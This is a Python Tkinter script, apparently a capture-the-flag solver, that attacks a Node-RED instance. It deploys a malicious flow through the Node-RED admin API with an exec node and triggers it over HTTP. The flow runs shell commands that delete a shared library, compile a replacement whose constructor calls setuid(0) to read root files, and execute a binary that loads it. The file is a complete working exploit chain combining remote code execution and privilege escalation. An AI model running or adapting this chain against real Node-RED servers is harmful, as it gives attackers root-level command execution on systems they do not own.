#!/usr/bin/env python3
import threading
import requests
import time
import tkinter as tk
from tkinter import scrolledtext, messagebox

class SolverApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Node-RED Exploit GUI")
        self.geometry("600x400")
        self.configure(bg="#0b0b0b")

        top = tk.Frame(self, bg="#0b0b0b")
        top.pack(pady=10, fill=tk.X, padx=10)

        tk.Label(top, text="Target URL:", bg="#0b0b0b", fg="#b25aff", font=("Courier", 12, "bold")).pack(side=tk.LEFT)
        self.url_entry = tk.Entry(top, bg="#1a1a1a", fg="#ece4d3", font=("Courier", 12), width=35, insertbackground="white")
        self.url_entry.insert(0, "https://node-47701d7b2f21.inst.omnictf.com")
        self.url_entry.pack(side=tk.LEFT, padx=5)

        self.btn = tk.Button(top, text="HACK", bg="#b25aff", fg="white", font=("Courier", 12, "bold"), command=self.start_exploit)
        self.btn.pack(side=tk.RIGHT, padx=5)

        self.log = scrolledtext.ScrolledText(self, bg="#050505", fg="#9aff6b", font=("Courier", 10), state=tk.DISABLED)
        self.log.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    def print_log(self, msg, color="#9aff6b"):
        self.log.config(state=tk.NORMAL)
        self.log.insert(tk.END, msg + "\n")
        self.log.see(tk.END)
        self.log.config(state=tk.DISABLED)
        self.update_idletasks()

    def start_exploit(self):
        self.btn.config(state=tk.DISABLED)
        self.log.config(state=tk.NORMAL)
        self.log.delete(1.0, tk.END)
        self.log.config(state=tk.DISABLED)
        url = self.url_entry.get().strip()
        threading.Thread(target=self.run_exploit, args=(url,), daemon=True).start()

    def run_exploit(self, url):
        self.print_log(f"[*] Targeting Node-RED at {url}...", "#b25aff")
        
        flow_id = "exploit_flow_1337"
        payload_cmd = """rm -f /var/lib/node/libshared.so
cat << "EOF" > /tmp/payload.c
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor))
void init(void) {
    setgid(0);
    setuid(0);
    system("cat /root/flag* 2>/dev/null");
}
void get_status(void) {}
void print_status(void) {}
void log_status(void) {}
void print_banner(void) {}
EOF
gcc -shared -fPIC /tmp/payload.c -o /var/lib/node/libshared.so 2>&1
/usr/local/bin/nodestatus 2>&1
        """.strip()

        flow = [
            {"id": flow_id, "type": "tab", "label": "Exploit"},
            {"id": "http_in", "type": "http in", "z": flow_id, "url": "/run_exploit", "method": "get", "wires": [["exec_cmd"]]},
            {"id": "exec_cmd", "type": "exec", "z": flow_id, "command": payload_cmd, "addpay": False, "append": "", "useSpawn": "false", "wires": [["http_out"], [], []]},
            {"id": "http_out", "type": "http response", "z": flow_id, "statusCode": "200", "wires": []}
        ]
        
        try:
            headers = {"Content-Type": "application/json", "Node-RED-API-Version": "v2", "Node-RED-Deployment-Type": "full"}
            
            self.print_log("[*] Fetching current flows to get revision ID...", "#b25aff")
            r = requests.get(f"{url}/flows", headers=headers)
            rev = r.json().get("rev", "")
            
            self.print_log("[*] Injecting and deploying malicious flow...", "#b25aff")
            deploy_data = {"flows": flow, "rev": rev}
            r2 = requests.post(f"{url}/flows", json=deploy_data, headers=headers)
            if r2.status_code == 200:
                self.print_log("[+] Flow deployed successfully!")
            else:
                self.print_log(f"[-] Flow deploy failed: {r2.status_code}", "#ff6b6b")
                
            self.print_log("[*] Triggering HTTP endpoint /api/run_exploit...", "#b25aff")
            time.sleep(1)
            
            r3 = requests.get(f"{url}/api/run_exploit")
            
            self.print_log("[*] RESPONSE:", "#6bb6ff")
            if "OmniCTF{" in r3.text:
                flag = r3.text.split("OmniCTF{")[1].split("}")[0]
                self.print_log(f"OmniCTF{{{flag}}}", "#ff6b6b")
            else:
                self.print_log(r3.text.strip(), "#ff6b6b")
            self.print_log("[+] Exploit chain complete.", "#b25aff")

        except Exception as e:
            self.print_log(f"[-] Error: {e}", "#ff6b6b")
        finally:
            self.btn.config(state=tk.NORMAL)

if __name__ == "__main__":
    app = SolverApp()
    app.mainloop()
